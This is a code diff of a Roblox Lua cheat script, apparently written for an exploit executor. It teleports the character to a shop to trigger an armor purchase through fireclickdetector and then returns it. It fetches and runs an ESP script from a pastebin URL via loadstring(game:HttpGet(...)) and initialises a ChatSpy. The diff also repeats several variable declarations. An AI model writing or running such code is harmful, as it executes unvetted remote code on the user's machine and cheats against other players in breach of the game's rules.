@@ -4,15 +4,35 @@ local character = player.Character or player.CharacterAdded:Wait()
 local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
 local initialPos = humanoidRootPart.CFrame
 
--- Teleport and interact
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+local initialPos = humanoidRootPart.CFrame
+
 humanoidRootPart.CFrame = CFrame.new(-934.092529, -25.2498283, 570.475342)
 wait(0.2)
-fireclickdetector(workspace.Ignored.Shop["[High-Medium Armor] - $2440"].ClickDetector)
+
+local shop = workspace:FindFirstChild("Ignored"):FindFirstChild("Shop")
+if shop then
+    local armor = shop:FindFirstChild("[High-Medium Armor] - $2440")
+    if armor then
+        local clickDetector = armor:FindFirstChild("ClickDetector")
+        if clickDetector then
+            fireclickdetector(clickDetector)
+        end
+    end
+end
+
 wait(0.1)
+
 humanoidRootPart.CFrame = initialPos
 
--- Load ESP script
-loadstring(game:HttpGet('https://pastebin.com/raw/qXhWm4Df'))()
+wait(0.1)
+
+Create("Esp!", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/qXhWm4Df'))()
+end)
 
 -- ChatSpy Initialization
 if getgenv().ChatSpy then return getgenv().ChatSpy end
